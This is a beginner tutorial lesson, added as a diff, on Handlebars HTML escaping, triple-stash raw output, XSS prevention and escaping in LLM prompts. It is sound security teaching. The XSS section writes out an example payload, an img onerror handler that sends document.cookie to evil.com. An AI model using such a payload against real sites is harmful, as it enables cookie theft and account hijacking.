@@ -1,0 +1,147 @@
+---
+title: "Safe Expressions"
+description: "Understanding HTML escaping, triple-stash for raw output, XSS prevention, and when to use each approach."
+day: "day-1"
+module: "module-1-handlebars"
+exercise: 4
+difficulty: "beginner"
+estimatedMinutes: 15
+isFree: true
+tags: ["handlebars", "templates", "escaping", "xss", "security", "triple-stash"]
+---
+
+## What You'll Learn
+
+You will learn how Handlebars automatically escapes HTML in double-stash expressions, how to output raw HTML with triple-stash, why this default behavior prevents security vulnerabilities, and when each approach is appropriate.
+
+## Key Concepts
+
+### HTML Escaping by Default
+
+When you use the standard `{{variable}}` syntax, Handlebars automatically escapes HTML special characters. This means characters like `<`, `>`, `&`, `"`, and `'` are converted to their safe HTML entity equivalents:
+
+```typescript
+import Handlebars from "handlebars";
+
+const template = Handlebars.compile("User said: {{message}}");
+
+const result = template({
+  message: '<script>alert("hacked!")</script>',
+});
+// "User said: &lt;script&gt;alert(&quot;hacked!&quot;)&lt;/script&gt;"
+```
+
+Instead of rendering an actual `<script>` tag, Handlebars converts it to `&lt;script&gt;`, which displays as plain text in a browser. This is a critical security feature.
+
+The characters that get escaped are:
+
+| Character | Escaped To |
+|-----------|-----------|
+| `&` | `&amp;` |
+| `<` | `&lt;` |
+| `>` | `&gt;` |
+| `"` | `&quot;` |
+| `'` | `&#x27;` |
+
+### Triple-Stash for Raw (Unescaped) Output
+
+Sometimes you genuinely need to include HTML in your output. The triple-stash syntax `{{{variable}}}` tells Handlebars to skip escaping and output the value exactly as-is:
+
+```typescript
+const template = Handlebars.compile("Content: {{{htmlContent}}}");
+
+const result = template({
+  htmlContent: "<strong>Bold text</strong> and <em>italic text</em>",
+});
+// "Content: <strong>Bold text</strong> and <em>italic text</em>"
+```
+
+With triple-stash, the HTML tags pass through unchanged. In a browser, this would render as **Bold text** and *italic text*.
+
+### Comparing Double and Triple Stash
+
+Here is a side-by-side comparison:
+
+```typescript
+const doubleStash = Handlebars.compile("{{content}}");
+const tripleStash = Handlebars.compile("{{{content}}}");
+
+const data = { content: "<b>Hello</b>" };
+
+console.log(doubleStash(data)); // "&lt;b&gt;Hello&lt;/b&gt;"
+console.log(tripleStash(data)); // "<b>Hello</b>"
+```
+
+The double-stash version is safe to display in any context. The triple-stash version preserves the original HTML.
+
+### What Is XSS and Why Does It Matter?
+
+XSS (Cross-Site Scripting) is a security attack where malicious code gets injected into a web page. If your template renders user-provided content without escaping, an attacker can inject JavaScript:
+
+```typescript
+// DANGEROUS: Using triple-stash with user input
+const template = Handlebars.compile("Welcome, {{{username}}}!");
+
+// A malicious user sets their name to:
+const result = template({
+  username: '<img src="x" onerror="document.location=\'https://evil.com/steal?cookie=\'+document.cookie">',
+});
+// This would execute JavaScript in the browser and steal cookies!
+```
+
+The default double-stash escaping prevents this entirely. This is why Handlebars escapes by default -- it is the safe choice.
+
+### When to Use Each
+
+**Use double-stash `{{variable}}` (the default) when:**
+- The value comes from user input
+- The value comes from an external API
+- You are not sure whether the value contains HTML
+- You want plain text output
+
+**Use triple-stash `{{{variable}}}` when:**
+- You control the HTML content completely (it is not user-generated)
+- You are building an HTML email with pre-built HTML fragments
+- You need to render Markdown-to-HTML output
+- You have already sanitized the content through another mechanism
+
+### Escaping in AI Engineering
+
+When building prompts for LLMs, you are typically producing plain text, not HTML. In that case, the escaping behavior of double-stash might actually cause problems:
+
+```typescript
+const promptTemplate = Handlebars.compile(
+  "Analyze this code: {{codeSnippet}}"
+);
+
+const result = promptTemplate({
+  codeSnippet: 'if (a < b && c > d) { return "yes"; }',
+});
+// "Analyze this code: if (a &lt; b &amp;&amp; c &gt; d) { return &quot;yes&quot;; }"
+```
+
+The `<`, `>`, `&`, and `"` characters in the code got escaped. If you are sending this to an LLM (not rendering it in HTML), you want the raw version:
+
+```typescript
+const promptTemplate = Handlebars.compile(
+  "Analyze this code: {{{codeSnippet}}}"
+);
+
+const result = promptTemplate({
+  codeSnippet: 'if (a < b && c > d) { return "yes"; }',
+});
+// "Analyze this code: if (a < b && c > d) { return \"yes\"; }"
+```
+
+This is an important nuance for AI engineering: if your template output goes to an LLM API (not a browser), you often want triple-stash to preserve the original content. But if any part of the output might be displayed in a web UI, stick with double-stash for safety.
+
+## Common Mistakes
+
+- **Using triple-stash with user input.** This is the most dangerous mistake. Never use `{{{userInput}}}` unless you have independently sanitized the content. Assume all user input is potentially malicious.
+- **Forgetting that double-stash escapes `&` characters.** If your data contains `&` (common in URLs, code, and company names like "AT&T"), double-stash turns it into `&amp;`. For plain-text prompt output, this may not be what you want.
+- **Assuming escaping means "secure."** Escaping prevents XSS in HTML contexts, but it does not prevent prompt injection or other AI-specific attacks. Security is always multi-layered.
+- **Mixing contexts.** If the same template output goes to both an HTML page and an LLM API, you have conflicting needs. Design your system so each template serves one context.
+
+## Your Task
+
+Create a template that demonstrates both double-stash and triple-stash behavior. Pass in a string containing HTML tags and verify that the double-stash version escapes them while the triple-stash version preserves them. Then consider which approach you would use for building LLM prompts versus rendering web pages.
